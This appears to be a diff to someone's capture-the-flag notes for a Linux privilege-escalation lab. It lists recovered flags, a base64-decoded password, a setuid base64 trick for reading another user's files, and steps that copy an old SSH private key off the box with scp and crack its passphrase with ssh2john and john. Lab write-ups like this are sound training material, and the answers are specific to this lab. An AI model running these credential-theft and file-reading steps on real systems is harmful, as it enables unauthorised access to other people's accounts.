@@ -219,12 +219,30 @@ sean is in the adm group so he can read /var/log
 grep -r 'sean{' /var/log 2>/dev/null
 sean{4c5685f4db7966a43cf8e95859801281}
 
+- What is penelope's flag?
+hint:cd /var/log
+grep -s "sean{" *
+echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
+p3nelope
+penelope{2da1c2e9d2bd0004556ae9e107c1d222}
 
 
+- What is maya's flag?
+hint: ls -asl /home/penelope
+....base64....maya
+./base64 "/home/maya/flag.txt" | base64 -d
+maya{a66e159374b98f64f89f7c8d458ebb2b}
 
 
-
-
+- What is robert's Passphrase?
+hint: ls -als /home/maya
+cd old_robert_ssh
+scp id_rsa gd@$ip:/home/
+locate ssh2john
+/usr/share/john/ssh2john id_rsa > hash.txt
+john hash.txt --worldlist=/usr/share/wordlists/rockyou.txt
+john hash.txt --show
+industryweapon
 
 
 
